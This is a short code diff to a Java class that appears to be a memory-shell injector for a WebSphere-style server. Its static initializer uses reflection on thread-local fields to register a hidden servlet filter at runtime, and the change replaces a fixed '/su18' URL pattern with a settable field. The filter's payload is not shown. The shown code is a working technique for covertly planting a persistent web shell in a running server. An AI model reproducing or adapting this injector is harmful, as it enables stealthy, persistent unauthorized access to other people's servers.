@@ -11,10 +11,11 @@ import java.util.List;
  */
 public class WSFMSFromThread implements Filter {
 
+	public static String pattern;
+
 	static {
 		try {
 			String filterName = "su18" + System.nanoTime();
-			String urlPattern = "/su18";
 
 			Class                   clazz = Thread.currentThread().getClass();
 			java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
@@ -83,7 +84,7 @@ public class WSFMSFromThread implements Filter {
 						field.set(filterConfig, null);
 
 						method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
-						method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});
+						method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{pattern}});
 
 						//addMappingForUrlPatterns 流程走完，再将其设置为原来的值
 						field.set(filterConfig, original);
